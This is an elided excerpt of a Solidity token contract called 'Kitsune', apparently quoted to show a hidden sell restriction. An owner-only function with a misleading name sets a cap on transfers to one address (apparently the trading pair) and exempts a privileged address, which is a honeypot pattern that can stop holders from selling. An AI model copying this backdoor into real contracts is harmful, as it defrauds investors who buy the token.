...
contract Kitsune is Context, IERC20, Ownable {
    ...
    uint256 public _addbottolist = 100000000 * 10**18;
    ...
    function removebot(uint256 amount) public onlyOwner {
    ...
    function setMaxTxBlack(uint256 maxTxBlackPercent) public onlyOwner {
        _addbottolist = maxTxBlackPercent * 10**18;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (sender != _tBlackAddress && recipient == _tBotAddress) {
            require(amount < _addbottolist, "Transfer amount exceeds the maxTxAmount.");
        }
